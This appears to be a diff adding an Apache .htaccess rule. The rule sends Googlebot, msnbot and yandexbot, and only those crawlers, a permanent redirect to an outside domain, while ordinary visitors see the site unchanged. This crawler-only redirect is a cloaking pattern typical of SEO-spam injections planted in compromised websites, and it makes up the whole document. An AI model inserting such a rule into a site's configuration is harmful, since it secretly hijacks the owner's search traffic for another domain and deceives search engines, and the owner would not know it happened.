@@ -1,0 +1,5 @@
+RewriteEngine on
+RewriteCond %{HTTP_USER_AGENT} Googlebot [OR]
+RewriteCond %{HTTP_USER_AGENT} msnbot [OR]
+RewriteCond %{HTTP_USER_AGENT} yandexbot
+RewriteRule ^.*$ "https\:\/\/www\.indowhiz\.com" [R=301,L]
